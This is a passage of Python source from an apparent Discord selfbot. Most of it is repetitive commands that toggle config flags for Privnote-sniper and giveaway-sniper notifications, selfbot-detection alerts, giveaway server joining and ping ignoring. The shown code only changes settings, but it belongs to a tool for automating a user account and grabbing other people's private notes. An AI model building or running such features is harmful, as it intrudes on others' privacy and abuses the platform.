                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Block DMs `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="nprivnote", description="Toggles Privnote Windows notifications")
    async def nprivnote(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['privnote_snipe_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['privnote_snipe_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Notifications', description='Privnote sniper notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Privnote sniper notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['privnote_snipe_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['privnote_snipe_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Notifications', description='Privnote sniper notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Privnote sniper notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="ngiveawaywin", description="Toggles giveaway win Windows notifications")
    async def ngiveawaywin(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['giveaway_win_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_win_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Notifications', description='Giveaway sniper win notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Giveaway sniper win notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['giveaway_win_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_win_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Notifications', description='Giveaway sniper win notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Giveaway sniper win notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()
            
    @React.command(usage="ngiveawayjoin", description="Toggles giveaway join Windows notifications")
    async def ngiveawayjoin(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['giveaway_join_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_join_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Notifications', description='Giveaway sniper join notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Giveaway sniper join notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['giveaway_join_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_join_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Notifications', description='Giveaway sniper join notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Giveaway sniper join notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="nsbdetection", description="Toggles selfbot detection Windows notifications")
    async def nsbdetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['selfbot_detection_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_detection_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Notifications', description='Giveaway detection notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Selfbot detection notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['selfbot_detection_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_detection_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Notifications', description='Selfbot detection notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Selfbot detection notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()
            
    @React.command(aliases=['gsniper'], usage="giveawaysniper", description="Toggles Giveaway sniping")
    async def giveawaysniper(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['giveaway_sniper'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_sniper'] = True
            giveaway_sniper = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Sniper', description='Sniping Giveaways `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Sniping Giveaways `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['giveaway_sniper'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_sniper'] = False
            giveaway_sniper = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Sniper', description='Sniping Giveaways `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Sniping Giveaways `disabled`'
                await ctx.send(msg)
                
        set_vars()
    
    @React.command(aliases=['gsniperjoin'], usage="giveawaysniperjoin", description="Toggles joining Giveaway servers")
    async def giveawaysniperjoin(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['giveaway_server_joiner'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_server_joiner'] = True
            giveaway_server_joiner = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Sniper', description='Joining giveaways servers `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Joining giveaways servers `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['giveaway_server_joiner'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_server_joiner'] = False
            giveaway_server_joiner = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Sniper', description='Joining giveaways servers `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Joining giveaways servers `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="ignorepings", description="Toggles ignoring @here & @everyone pings")
    async def ignorepings(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ignore_pings'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ignore_pings'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ignore Pings', description='Every @here & @everyone `gets ignored`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = '`Every @here & @everyone now get\'s ignored`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ignore_pings'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ignore_pings'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ignore Pings', description='Every @here & @everyone `does not get ignored`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = '`Every @here & @everyone now does not get\'s ignored`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="ignoreallpings", description="Toggles ignoring all pings")
    async def ignoreallpings(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ignore_all_pings'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ignore_all_pings'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ignore Pings', description='Every ping now `gets ignored`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = '`Every @here & @everyone now get\'s ignored`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ignore_all_pings'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ignore_all_pings'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ignore Pings', description='Every ping now `does not get ignored`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = '`Every ping now does not get\'s ignored`'
                await ctx.send(msg)
                
        set_vars()
            
    @React.command(usage="deletetimeout <Infinite/(Seconds)>", description="Sets the time after that embeds should be deleted")
    async def deletetimeout(ctx, timeout):
        try:
        
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            if timeout.lower() != 'infinite':
                data['delete_timeout'] = int(timeout)
                delete_timeout = int(timeout)
            else:
                data['delete_timeout'] = 94608000
                delete_timeout = 94608000
            
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Delete Timeout', description=f'Delete timeout set to {timeout} seconds',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
